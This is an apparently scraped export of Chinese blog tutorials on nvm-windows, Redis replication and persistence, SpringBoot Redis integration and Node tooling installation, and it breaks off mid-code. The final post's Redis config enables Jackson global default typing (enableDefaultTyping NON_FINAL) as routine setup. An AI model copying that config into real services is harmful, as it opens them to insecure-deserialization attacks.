版本管理器，可以让你在同一台计算机上安装和管理多个 Node.js 版本。 以下是使用 nvm-windows 工具的步骤： 下载安装包 1https://github.com/coreybutler/nvm-windows/releases/tag/1.1.11 首先需要下载并安装 nvm-windows 工具。可以从 GitHub 上下载最新版本的安装包。下载后，直接运行安装程序按照提示进行安装即可。 安装 Node.js 版本 安装完成后，在命令行中输入以下命令来安装 Node.js 的不同版本： 1nvm install 14.17.5 这将安装 Node.js v14.17.5 版本。如果要安装其他版本，只需将 14.17.5 替换为所需的版本即可。安装完成后，可以使用以下命令查看已安装的 Node.js 版本： 1nvm list 切换 Node.js 版本 要切换到已安装的特定版本，可以使用以下命令： 1nvm use 14.17.5 这将使当前命令行窗口使用 Node.js v14.17.5 版本。如果要设置默认版本，请使用以下命令： 1nvm alias default 14.17.5 这将将 Node.js v14.17.5 设置为默认版本。每次打开一个新的命令行窗口时，都会自动将其设置为默认版本。 其他命令 除了上述命令外， nvm-windows 还提供了其他有用的命令，例如： nvm on ：启用 nvm 环境变量。 nvm off ：禁用 nvm 环境变量。 nvm uninstall 14.17.5 ：卸载 Node.js v14.17.5 版本。 以上是在 Windows 环境下使用 nvm-windows 工具管理多个 Node.js 版本的基本步骤。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/03/28/%E3%80%90NodeJS%E3%80%91Windows%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%A6%82%E4%BD%95%E5%81%9ANode%E5%A4%9A%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%EF%BC%9F/"},{"title":"redis主从集群-哨兵模式搭建文档","text":"准备工作 # 三台服务器 服务器 ip 角色 192.168.20.1 主 192.168.20.2 从 192.168.20.3 从 # docker 安装 redis docker pull redis # 运行 分别从三台服务器运行 redis 镜像，注意映射不同外端口 1docker run -p 6380:6379 --name redis -v /mydata/redis/data/redis.conf:/etc/redis/redis.conf -v /mydata/redis/data:/data -d redis redis-server /etc/redis/redis.conf --appendonly yes --daemonize no --masterauth #如果主节点设置了密码，请输入主服务密码 docker exec -it redis_master /bin/bash # 查看角色 # 主： 12345678910111213141516127.0.0.1:6379&gt; auth #你的密码OK127.0.0.1:6379&gt; info replication# Replicationrole:masterconnected_slaves:0master_failover_state:no-failovermaster_replid:f28e9097e4c8cd3f67292181be12955909afd88emaster_replid2:0000000000000000000000000000000000000000master_repl_offset:0second_repl_offset:-1repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0127.0.0.1:6379&gt; # 从 01: 1234567891011121314127.0.0.1:6379&gt; info replication# Replicationrole:masterconnected_slaves:0master_failover_state:no-failovermaster_replid:48a7e3866afc4b6784ef49353b57fbc979ee2935master_replid2:0000000000000000000000000000000000000000master_repl_offset:0second_repl_offset:-1repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0127.0.0.1:6379&gt; # 从 02： 1234567891011121314127.0.0.1:6379&gt; info replication# Replicationrole:masterconnected_slaves:0master_failover_state:no-failovermaster_replid:de30809041f22f2dd6abc9cb34536f26df97e647master_replid2:0000000000000000000000000000000000000000master_repl_offset:0second_repl_offset:-1repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0127.0.0.1:6379&gt; # 在两台从服务器上执行命令 replicaof 192.168.20.1 6379 123127.0.0.1:6379&gt; replicaof 192.168.20.1 6379OK127.0.0.1:6379&gt; # 查看主服务信息 12345678910111213141516171819202122232425262728293031323334353637127.0.0.1:6379&gt; info replication# Replicationrole:master ###从服务器信息connected_slaves:2slave0:ip=172.17.0.3,port=6379,state=online,offset=1456,lag=1slave1:ip=172.17.0.4,port=6379,state=online,offset=1456,lag=0###从服务器信息 master_failover_state:no-failovermaster_replid:9b8c2ef4539809505fa5bc1dd779c4500298011dmaster_replid2:0000000000000000000000000000000000000000master_repl_offset:1456second_repl_offset:-1repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:1repl_backlog_histlen:1456127.0.0.1:6379&gt; 127.0.0.1:6379&gt; info replication# Replicationrole:masterconnected_slaves:0master_failover_state:no-failovermaster_replid:f28e9097e4c8cd3f67292181be12955909afd88emaster_replid2:0000000000000000000000000000000000000000master_repl_offset:0second_repl_offset:-1repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0127.0.0.1:6379&gt; # 测试： 主服务器上： 123127.0.0.1:6379&gt; set name zsOK127.0.0.1:6379&gt; # 从服务器也可以查看到信息 12345127.0.0.1:6379&gt; replicaof 192.168.20.1 6379OK127.0.0.1:6379&gt; get name&quot;zs&quot;127.0.0.1:6379&gt; # 异常统计： 可能遇到的 BUG：MASTER aborted replication with an error: NOAUTH Authentication required. 场景：在配置主从后发现两个从节点的 info replication 中出现：master_link_status:down 原因：大部分原因是因为主节点配置了密码 解决：在从节点的配置文件中加入 masterauth 你的主节点密码 即可 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/02/08/%E3%80%90Redis%E3%80%91Redis%E4%B8%BB%E4%BB%8E%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%E6%96%87%E6%A1%A3/"},{"title":"Redis持久化","text":"# 一、持久化简介 Redis 的数据 全部存储 在 内存 中，如果 突然宕机，数据就会全部丢失，因此必须有一套机制来保证 Redis 的数据不会因为故障而丢失，这种机制就是 Redis 的 持久化机制，它会将内存中的数据库状态保存到磁盘 中。 持久化发生了什么？ | 从内存到磁盘： 我们来稍微考虑一下 Redis 作为一个内存数据库 要做的关于持久化的事情。通常来说，从客户端发 起请求开始，到服务器真实地写入磁盘，需要发生如下几件事情： 详细版 的文字描述大概就是下面这样： \\1. 客户端向数据库 发送写命令 (数据在客户端的内存中) \\2. 数据库 接收 到客户端的 写请求 (数据在服务器的内存中) \\3. 数据库 调用系统 API 将数据写入磁盘 (数据在内核缓冲区中) \\4. 操作系统将 写缓冲区 传输到 磁盘控控制器 (数据在磁盘缓存中) \\5. 操作系统的磁盘控制器将数据 写入实际的物理媒介 中 (数据在磁盘中) ** 注意、上面的过程其实是 ** 极度精简 的，在实际的操作系统中，缓存 和 缓冲区 会比这 多得多… # 如何尽可能保证持久化的安全 如果我们故障仅仅涉及到 软件层面 (该进程被管理员终止或程序崩溃) 并且没有接触到内核，那么在 上 述步骤 3 成功返回之后，我们就认为成功了。即使进程崩溃，操作系统仍然会帮助我们把数据正确地写入磁盘。 如果我们考虑 ** 停电 ** 火灾 等 更具灾难性 的事情，那么只有在完成了第 5 步之后，才是安全的。 所以我们可以总结得出数据安全最重要的阶段是：步骤三、四、五，即： 数据库软件调用写操作将用户空间的缓冲区转移到内核缓冲区的频率是多少？ 内核多久从缓冲区取数据刷新到磁盘控制器？ 磁盘控制器多久把数据写入物理媒介一次？ 注意： 如果真的发生灾难性的事件，我们可以从上图的过程中看到，任何一步都可能被意外打断 丢失，所以只能 尽可能地保证 数据的安全，这对于所有数据库来说都是一样的。 我们从 第三步 开始。Linux 系统提供了清晰、易用的用于操作文件的 POSIX file API ， 20 多年过 去，仍然还有很多人对于这一套 API 的设计津津乐道，我想其中一个原因就是因为你光从 API 的命名 就能够很清晰地知道这一套 API 的用途： 12345int open(const char *path, int oflag, .../*,mode_t mode */);int close (int filedes);int remove( const char *fname ); ssize_t write(int fildes, const void *buf, size_t nbyte);ssize_t read(int fildes, void *buf, size_t nbyte); 所以，我们有很好的可用的 API 来完成 第三步，但是对于成功返回之前，我们对系统调用花费的时间没有太多的控制权。 然后我们来说说 第四步。我们知道，除了早期对电脑特别了解那帮人 (操作系统就这帮人搞的)，实际的物理硬件都不是我们能够 直接操作 的，都是通过 操作系统调用 来达到目的的。为了防止过慢的 I/O 操作拖慢整个系统的运行，操作系统层面做了很多的努力，譬如说 上述第四步 提到的 写缓冲区，并不是所有的写操作都会被立即写入磁盘，而是要先经过一个缓冲区，默认情况下，Linux 将在 30 秒 后实际提交写入。 但是很明显，30 秒 并不是 Redis 能够承受的，这意味着，如果发生故障，那么最近 30 秒内写入的所有数据都可能会丢失。幸好 PROSIX API 提供了另一个解决方案： fsync ，该命令会 强制 内核将 缓 **** 冲区 写入 磁盘，但这是一个非常消耗性能的操作，每次调用都会 阻塞等待 直到设备报告 IO 完成，所以一般在生产环境的服务器中，Redis 通常是每隔 1s 左右执行一次 fsync 操作。到目前为止，我们了解到了如何控制 第三步 和 第四步 ，但是对于 第五步，我们 完全无法控制。也许一些内核实现将试图告诉驱动实际提交物理介质上的数据，或者控制器可能会为了提高速度而重新排序写操作，不会尽快将数据真正写到磁盘上，而是会等待几个多毫秒。这完全是我们无法控制的。 # ** 二、Redis ** 中的两种持久化方式 方式一：快照 Redis 快照 是最简单的 Redis 持久性模式。当满足特定条件时，它将生成数据集的时间点快照，例如， 如果先前的快照是在 2 分钟前创建的，并且现在已经至少有 100 次新写入，则将创建一个新的快照。此条件可以由用户配置 Redis 实例来控制，也可以在运行时修改而无需重新启动服务器。快照作为包含整个数据集的单个 .rdb 文件生成。 但我们知道，Redis 是一个 单线程 的程序，这意味着，我们不仅仅要响应用户的请求，还需要进行内存快照。而后者要求 Redis 必须进行 IO 操作，这会严重拖累服务器的性能。 还有一个重要的问题是，我们在 持久化的同时，内存数据结构 还可能在 变化，比如一个大型的 hash 字典正在持久化，结果一个请求过来把它删除了，可是这才刚持久化结束，咋办？ 使用系统多进程 COW(Copy On Write) 机制 | fork 函数 操作系统多进程 COW(Copy On Write) 机制 拯救了我们。Redis 在持久化时会调用 glibc 的函数 fork 产生一个子进程，简单理解也就是基于当前进程 复制 了一个进程，主进程和子进程会共享内存 里面的代码块和数据段： 这里多说一点，为什么 fork 成功调用后会有两个返回值呢？ 因为子进程在复制时复制了父进程的堆栈 段，所以两个进程都停留在了 fork 函数中 (都在同一个地方往下继续 &quot; 同时 &quot; 执行)，等待返回，所以 一 次在父进程中返回子进程的 pid**，另一次在子进程中返回零，系统资源不够时返回负数 123456pid = os.fork() if pid &gt; 0a: handle_client_request() # 父进程继续处理客户端请求 if pid == 0: handle_snapshot_write() # 子进程处理快照写磁盘 if pid &lt; 0: # fork error 所以 快照持久化 可以完全交给 子进程 来处理，父进程 则继续 处理客户端请求。子进程 做数据持久 化，它 不会修改现有的内存数据结构，它只是对数据结构进行遍历读取，然后序列化写到磁盘中。但是 父进程 不一样，它必须持续服务客户端请求，然后对 内存数据结构进行不间断的修改。 这个时候就会使用操作系统的 COW 机制来进行 数据段页面 的分离。数据段是由很多操作系统的页面组合而成，当父进程对其中一个页面的数据进行修改时，会将被共享的页面复 制一份分离出来，然后 对这个复制的页面进行修改。这时 子进程 相应的页面是 没有变化的，还是进程产生时那一瞬间的数据。 子进程因为数据没有变化，它能看到的内存里的数据在进程产生的一瞬间就凝固了，再也不会改变，这也是为什么 Redis 的持久化 叫「快照」的原因。接下来子进程就可以非常安心的遍历数据了进行序列化写磁盘了。 快照不是很持久。如果运行 Redis 的计算机停止运行，电源线出现故障或者您 kill -9 的实例意外发生，则写入 Redis 的最新数据将丢失。尽管这对于某些应用程序可能不是什么大问题，但有些使用案例具有充分的耐用性，在这些情况下，快照并不是可行的选择。 AOF(Append Only File - 仅追加文件 **)** 它的工作方式非常简单：每次执行 修改内存 中数据集的写操作时，都会 记录 该操作。假设 AOF 日志记录了自 Redis 实例创建以来 所有的修改性指令序列，那么就可以通过对一个空的 Redis 实例 顺序执行所有的指令，也就是 「重放」，来恢复 Redis 当前实例的内存数据结构的状态。 # AOF 重写 Redis 在长期运行的过程中，AOF 的日志会越变越长。如果实例宕机重启，重放整个 AOF 日志会非常耗时，导致长时间 Redis 无法对外提供服务。所以需要对 AOF 日志 瘦身。 Redis 提供了 bgrewriteaof 指令用于对 AOF 日志进行瘦身。其 原理 就是 开辟一个子进程 对内存进行 遍历 转换成一系列 Redis 的操作指令，序列化到一个新的 AOF 日志文件 中。序列化完毕后再将操作期间发生的 增量 AOF 日志 追加到这个新的 AOF 日志文件中，追加完毕后就立即替代旧的 AOF 日志文件了，瘦身工作就完成了。 fsync AOF 日志是以文件的形式存在的，当程序对 AOF 日志文件进行写操作时，实际上是将内容写到了内核 为文件描述符分配的一个内存缓存中，然后内核会异步将脏数据刷回到磁盘的。 就像我们 上方第四步 描述的那样，我们需要借助 glibc 提供的 fsync (int fd) 函数来讲指定的文件内容 强制从内核缓存刷到磁盘。但 强制开车 仍然是一个很消耗资源的一个过程，需要 节制！通常来说，生产环境的服务器，Redis 每隔 1s 左右执行一次 fsync 操作就可以了。 Redis 同样也提供了另外两种策略，一个是 永不 fsync，来让操作系统来决定合适同步磁盘，很不安全，另一个是 来一个指令就 fsync 一次，非常慢。但是在生产环境基本不会使用，了解一下即可。 # Redis 4.0 混合持久化 重启 Redis 时，我们很少使用 rdb 来恢复内存状态，因为会丢失大量数据。我们通常使用 AOF 日志重放，但是重放 AOF 日志性能相对 rdb 来说要慢很多，这样在 Redis 实例很大的情况下，启动需要花费很长的时间。 Redis 4.0 为了解决这个问题，带来了一个新的持久化选项 —— 混合持久化。将 rdb 文件的内容和增量的 AOF 日志文件存在一起。这里的 AOF 日志不再是全量的日志，而是 自持久化开始到持久化结束 的 这段时间发生的增量 AOF 日志，通常这部分 AOF 日志很小： 于是在 Redis 重启的时候，可以先加载 rdb 的内容，然后再重放增量 AOF 日志就可以完全替代之前的 AOF 全量文件重放，重启效率因此大幅得到提升。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/16/%E3%80%90Redis%E3%80%91Redis%E6%8C%81%E4%B9%85%E5%8C%96/"},{"title":"【Redis】SpringBoot整合Redis，缓存批量删除  redisTemplate.keys(pattern)模糊查询找不到keys，“  “ 通配符无效","text":"# 【Redis】SpringBoot 整合 Redis，缓存批量删除 redisTemplate.keys (pattern) 模糊查询找不到 keys，“ “ 通配符无效 # 引言 最近，在学习 Spring Boot 整合 Redis 的知识，在业务中需要删除某个前缀的所有 Redis 缓存，首先使用 RedisTemplate.keys () 模糊查询出所有合适的 keys，再使用 redisTemplate.delete () 方法进行批量删除。参考代码： 12Set&lt;String&gt; keys = redisTemplate.keys(prefix + &quot;*&quot;);redisTemplate.delete(pageKeys); 然而，发现 redisTemplate.keys (prefix + “*” ) 模糊查询，总是返回一个空的集合，找不到 key。 在日志中打印查询的 keys 集合，一直为空集合： # 1、问题分析： 首先，确保查询字符串正确。 然后，尝试 redisTemplate.keys (key) ，用完整的一个 key 进行查询，发现能正常返回只有一个 key 的集合。 说明模糊查询 的 通配符 &quot; * &quot; 没有发挥作用，可能只是被当作一个普通的字符了。 # 2、问题解决： 为 redis 添加配置文件 RedisConfig，重新定义 RedisTemplate 的 key 为 String 类型： 123456789101112131415@Configurationpublic class RedisConfig { @Bean(name = &quot;redisTemplate&quot;) public RedisTemplate&lt;String, Object&gt; redisTemplate(RedisConnectionFactory redisConnectionFactory){ RedisTemplate&lt;String, Object&gt; redisTemplate = new RedisTemplate&lt;&gt;(); redisTemplate.setConnectionFactory(redisConnectionFactory); StringRedisSerializer redisSerializer = new StringRedisSerializer(); // key采用String的序列化方式 redisTemplate.setKeySerializer(redisSerializer); // hash的key也采用String的序列化方式 redisTemplate.setHashKeySerializer(redisSerializer); return redisTemplate; }} 再次测试 redisTemplate.keys (prefix + “*” ) 模糊查询，可以正常返回缓存中的 keys 集合！！！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/02/04/%E3%80%90Redis%E3%80%91SpringBoot%E6%95%B4%E5%90%88Redis%EF%BC%8C%E7%BC%93%E5%AD%98%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4%20%20redisTemplate.keys(pattern)%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2%E6%89%BE%E4%B8%8D%E5%88%B0keys%EF%BC%8C%E2%80%9C%20%20%E2%80%9C%20%E9%80%9A%E9%85%8D%E7%AC%A6%E6%97%A0%E6%95%88/"},{"title":"node&amp;npm&amp;cnpm&amp;webpack&amp;yarn安装教程","text":"# Node.js ​ nodejs 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与 PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言 ​ nodejs 能做 web 开发，REST 开发，小程序开发等等，它就是使用 JavaScript 进行开发的，也就是说，基本上每个 web 开发的人员都可以比较轻松的转到 nodejs 平台，nodejs 就像是 JavaScript 抛弃 window,document 等这些 dom 对象后的东西的一个封装 nodejs 下载地址：https://nodejs.org/en/ # Node.js 安装： ​ 1 . 首先要查看本机是否已安装 nodeJs，打开命令提示符，输入 node&amp;node -v 查看。 ​ 2 . 打开 Node.js Setup 文件执行安装 选择安装路径，全部下一步。 ​ 3 . 安装完毕之后，重新打开一个命令提示符窗口，出入 node -v 现在，我们来 Hello World 一下，开启命令行窗口，输入 node，进入 node 的命令行，我们可以输入 console.log (“hello world”) 123或者，我们可以创建一个web服务，进入node命令行后，输入View Code回车后，在浏览器输入：http://localhost:8000就输出了hello world # npm： # npm 安装： Nodejs 下的包管理器。 下载 Node 后自带一个旧版本的 npm。 # cnpm: Nodejs 下的包管理器，国内淘宝镜像版本。 # cnpm 安装： 首先要有 node 环境和 npm 环境– 1、安装 cnpm，输入以下命令： 1npm install -g cnpm --registry=https://registry.npm.taobao.org 如图所示： 2、输入 cnpm -v ，检测是否正常 # webpack: 它主要的用途是通过 CommonJS 的语法把所有浏览器端需要发布的静态资源做相应的准备，比如资源的合并和打包。 # webpack 安装： 首先需要安装好 nodeJs&amp;npm 的环境～ 12node -v // 查看node的版本 不能太高npm -v //查看npm的版本 全局安装: 打开命令行（win+R 输入 cmd） 123npm install webpack webpack-cli -g --save-dev #输入并执行下载webpack -g #全局安装 --save-dev #信息写入package.json的devDependencies中 下载好后在命令行执行 webpack -v 查看 webpack 的版本号，正常显示说明安装好了 # yarn： ​ Yarn 是 facebook 发布的一款取代 npm 的包管理工具。 ​ Yarn 缓存了每个下载过的包，所以再次使用时无需重复下载。 同时利用并行下载以最大化资源利用率，因此安装速度更快，在执行代码之前，Yarn 会通过算法校验每个安装包的完整性，使用详细、简洁的锁文件格式和明确的安装算法，Yarn 能够保证在不同系统上无差异的工作。 # yarn 安装: 首先需要 node.js &amp; npm 环境 输入命令： npm install -g yarn 查看版本：yarn -V &amp; --version 123Yarn 淘宝源安装，分别复制粘贴以下代码行到黑窗口运行即可yarn config set registry https://registry.npm.taobao.org -gyarn config set sass_binary_site http://cdn.npm.taobao.org/dist/node-sass -g 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354yarn的常用命令：安装yarn：npm install -g yarn安装成功后，查看版本号：yarn --version创建文件夹 ：md yarn进入yarn文件夹：cd yarn初始化项目：yarn init // 同npm init，执行输入信息后，会生成package.json文件yarn的配置项：yarn config list // 显示所有配置项yarn config get &lt;key&gt; //显示某配置项yarn config delete &lt;key&gt; //删除某配置项yarn config set &lt;key&gt; &lt;value&gt; [-g|--global] //设置配置项安装包：yarn install //安装package.json里所有包，并将包及它的所有依赖项保存进yarn.lockyarn install --flat //安装一个包的单一版本yarn install --force //强制重新下载所有包yarn install --production //只安装dependencies里的包yarn install --no-lockfile //不读取或生成yarn.lockyarn install --pure-lockfile //不生成yarn.lock添加包（会更新package.json和yarn.lock）：yarn add [package] // 在当前的项目中添加一个依赖包，会自动更新到package.json和yarn.lock文件中yarn add [package]@[version] // 安装指定版本，这里指的是主要版本，如果需要精确到小版本，使用-E参数yarn add [package]@[tag] // 安装某个tag（比如beta,next或者latest）//不指定依赖类型默认安装到dependencies里，你也可以指定依赖类型：yarn add --dev/-D // 加到 devDependenciesyarn add --peer/-P // 加到 peerDependenciesyarn add --optional/-O // 加到 optionalDependencies//默认安装包的主要版本里的最新版本，下面两个命令可以指定版本：yarn add --exact/-E // 安装包的精确版本。例如yarn add foo@1.2.3会接受1.9.1版，但是yarn add foo@1.2.3 --exact只会接受1.2.3版yarn add --tilde/-T // 安装包的次要版本里的最新版。例如yarn add foo@1.2.3 --tilde会接受1.2.9，但不接受1.3.0发布包yarn publish移除一个包yarn remove &lt;packageName&gt;：移除一个包，会自动更新package.json和yarn.lock更新一个依赖yarn upgrade 用于更新包到基于规范范围的最新版本运行脚本yarn run 用来执行在 package.json 中 scripts 属性下定义的脚本显示某个包的信息yarn info &lt;packageName&gt; 可以用来查看某个模块的最新版本信息缓存yarn cacheyarn cache list # 列出已缓存的每个包 yarn cache dir # 返回 全局缓存位置 yarn cache clean # 清除缓存 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/04/10/%E3%80%90Node%E3%80%91node&npm&cnpm&webpack&yarn%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"},{"title":"SpringBoot+Redis实现高性能，强支持的点赞-查看收藏流程设计","text":"# SpringBoot+Redis 实现高性能，强支持的点赞流程设计 # 前言 本文基于 SpringCloudAlibaba, 用户发起点赞、取消点赞，后先存入 Redis 中，再每隔两小时从 Redis 读取点赞数据写入数据库中做持久化存储。 点赞功能在很多系统中都有，但别看功能小，想要做好需要考虑的东西还挺多的。 点赞、取消点赞是高频次的操作，若每次都读写数据库，大量的操作会影响数据库性能，所以需要做缓存。 至于多久从 Redis 取一次数据存到数据库中，根据项目的实际情况定吧，我是暂时设了两个小时。 项目需求需要查看都谁点赞了，所以要存储每个点赞的点赞人、被点赞人，不能简单的做计数。 # 文章分四部分介绍： Redis 缓存设计及实现 数据库设计 数据库操作 开启定时任务持久化存储到数据库 # 一、Redis 缓存设计及实现 # 1.1 Redis 安装及运行 Redis 安装请自行查阅相关教程。 说下 Docker 安装运行 Redis 1docker run -d -p 6379:6379 redis:4.0.8 如果已经安装了 Redis，打开命令行，输入启动 Redis 的命令 1redis-server # 1.2 Redis 与 SpringBoot 项目的整合 在 pom.xml 中引入依赖 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt; 在启动类上添加注释 @EnableCaching 1234567891011@SpringBootApplication@EnableDiscoveryClient@EnableSwagger2@EnableFeignClients(basePackages = &quot;com.solo.coderiver.project.client&quot;)@EnableCachingpublic class UserApplication { public static void main(String[] args) { SpringApplication.run(UserApplication.class, args); }} 编写 Redis 配置类 RedisConfig 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import com.fasterxml.jackson.annotation.JsonAutoDetect;import com.fasterxml.jackson.annotation.PropertyAccessor;import com.fasterxml.jackson.databind.ObjectMapper;import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.data.redis.connection.RedisConnectionFactory;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.core.StringRedisTemplate;import org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;import java.net.UnknownHostException;@Configurationpublic class RedisConfig { @Bean @ConditionalOnMissingBean(name = &quot;redisTemplate&quot;) public RedisTemplate&lt;String, Object&gt; redisTemplate( RedisConnectionFactory redisConnectionFactory) throws UnknownHostException { Jackson2JsonRedisSerializer&lt;Object&gt; jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer&lt;Object&gt;(Object.class); ObjectMapper om = new ObjectMapper(); om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY); om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); jackson2JsonRedisSerializer.setObjectMapper(om); RedisTemplate&lt;String, Object&gt; template = new RedisTemplate&lt;String, Object&gt;(); template.setConnectionFactory(redisConnectionFactory); template.setKeySerializer(jackson2JsonRedisSerializer); template.setValueSerializer(jackson2JsonRedisSerializer); template.setHashKeySerializer(jackson2JsonRedisSerializer); template.setHashValueSerializer(jackson2JsonRedisSerializer); template.afterPropertiesSet(); return template; } @Bean @ConditionalOnMissingBean(StringRedisTemplate.class) public StringRedisTemplate stringRedisTemplate( RedisConnectionFactory redisConnectionFactory) throws UnknownHostException { StringRedisTemplate template = new StringRedisTemplate(); template.setConnectionFactory(redisConnectionFactory); return template; }} 至此 Redis 在 SpringBoot 项目中的配置已经完成，可以愉快的使用了。 # 1.3 Redis 的数据结构类型 Redis 可以存储键与 5 种不同数据结构类型之间的映射，这 5 种数据结构类型分别为 String（字符串）、List（列表）、Set（集合）、Hash（散列）和 Zset（有序集合）。 下面来对这 5 种数据结构类型作简单的介绍： 结构类型 结构存储的值 结构的读写能力 String 可以是字符串、整数或者浮点数 对整个字符串或者字符串的其中一部分执行操作；对象和浮点数执行自增 (increment) 或者自减 (decrement) List 一个链表，链表上的每个节点都包含了一个字符串 从链表的两端推入或者弹出元素；根据偏移量对链表进行修剪 (trim)；读取单个或者多个元素；根据值来查找或者移除元素 Set 包含字符串的无序收集器 (unorderedcollection)，并且被包含的每个字符串都是独一无二的、各不相同 添加、获取、移除单个元素；检查一个元素是否存在于某个集合中；计算交集、并集、差集；从集合里卖弄随机获取元素 Hash 包含键值对的无序散列表 添加、获取、移除单个键值对；获取所有键值对 Zset 字符串成员 (member) 与浮点数分值 (score) 之间的有序映射，元素的排列顺序由分值的大小决定 添加、获取、删除单个元素；根据分值范围 (range) 或者成员来获取元素 # 1.4 点赞数据在 Redis 中的存储格式 用 Redis 存储两种数据，一种是记录点赞人、被点赞人、点赞状态的数据，另一种是每个用户被点赞了多少次，做个简单的计数。 由于需要记录点赞人和被点赞人，还有点赞状态（点赞、取消点赞），还要固定时间间隔取出 Redis 中所有点赞数据，分析了下 Redis 数据格式中 Hash 最合适。 因为 Hash 里的数据都是存在一个键里，可以通过这个键很方便的把所有的点赞数据都取出。这个键里面的数据还可以存成键值对的形式，方便存入点赞人、被点赞人和点赞状态。 设点赞人的 id 为 likedPostId ，被点赞人的 id 为 likedUserId ，点赞时状态为 1，取消点赞状态为 0。将点赞人 id 和被点赞人 id 作为键，两个 id 中间用 :: 隔开，点赞状态作为值。 所以如果用户点赞，存储的键为： likedUserId::likedPostId ，对应的值为 1 。 取消点赞，存储的键为： likedUserId::likedPostId ，对应的值为 0 。 取数据时把键用 :: 切开就得到了两个 id，也很方便。 # 1.5 操作 Redis Redis 各种数据格式的操作方法可以看看 这篇文章 ，写的非常好。 将具体操作方法封装到了 RedisService 接口里 RedisService.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import com.solo.coderiver.user.dataobject.UserLike;import com.solo.coderiver.user.dto.LikedCountDTO;import java.util.List;public interface RedisService { /** * 点赞。状态为1 * @param likedUserId * @param likedPostId */ void saveLiked2Redis(String likedUserId, String likedPostId); /** * 取消点赞。将状态改变为0 * @param likedUserId * @param likedPostId */ void unlikeFromRedis(String likedUserId, String likedPostId); /** * 从Redis中删除一条点赞数据 * @param likedUserId * @param likedPostId */ void deleteLikedFromRedis(String likedUserId, String likedPostId); /** * 该用户的点赞数加1 * @param likedUserId */ void incrementLikedCount(String likedUserId); /** * 该用户的点赞数减1 * @param likedUserId */ void decrementLikedCount(String likedUserId); /** * 获取Redis中存储的所有点赞数据 * @return */ List&lt;UserLike&gt; getLikedDataFromRedis(); /** * 获取Redis中存储的所有点赞数量 * @return */ List&lt;LikedCountDTO&gt; getLikedCountFromRedis();} 实现类 RedisServiceImpl.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495import com.solo.coderiver.user.dataobject.UserLike;import com.solo.coderiver.user.dto.LikedCountDTO;import com.solo.coderiver.user.enums.LikedStatusEnum;import com.solo.coderiver.user.service.LikedService;import com.solo.coderiver.user.service.RedisService;import com.solo.coderiver.user.utils.RedisKeyUtils;import lombok.extern.slf4j.Slf4j;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.data.redis.core.Cursor;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.core.ScanOptions;import org.springframework.stereotype.Service;import java.util.ArrayList;import java.util.List;import java.util.Map;@Service@Slf4jpublic class RedisServiceImpl implements RedisService { @Autowired RedisTemplate redisTemplate; @Autowired LikedService likedService; @Override public void saveLiked2Redis(String likedUserId, String likedPostId) { String key = RedisKeyUtils.getLikedKey(likedUserId, likedPostId); redisTemplate.opsForHash().put(RedisKeyUtils.MAP_KEY_USER_LIKED, key, LikedStatusEnum.LIKE.getCode()); } @Override public void unlikeFromRedis(String likedUserId, String likedPostId) { String key = RedisKeyUtils.getLikedKey(likedUserId, likedPostId); redisTemplate.opsForHash().put(RedisKeyUtils.MAP_KEY_USER_LIKED, key, LikedStatusEnum.UNLIKE.getCode()); } @Override public void deleteLikedFromRedis(String likedUserId, String likedPostId) { String key = RedisKeyUtils.getLikedKey(likedUserId, likedPostId); redisTemplate.opsForHash().delete(RedisKeyUtils.MAP_KEY_USER_LIKED, key); } @Override public void incrementLikedCount(String likedUserId) { 